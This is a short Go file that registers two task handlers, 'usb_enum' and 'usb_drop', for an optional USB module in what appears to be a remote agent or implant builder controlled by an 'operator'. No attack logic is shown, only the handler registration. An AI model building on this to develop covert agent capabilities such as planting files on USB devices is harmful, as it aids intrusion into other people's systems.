//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "usb" module (see internal/payload/agent_modules.go).
// The generator drops this file whole when the operator excludes the module;
// every entry point below disappears with it and the linker dead-codes the
// unreferenced handlers.

func init() {
	taskHandlers["usb_enum"] = handleUSBEnum
	taskHandlers["usb_drop"] = handleUSBDrop
}
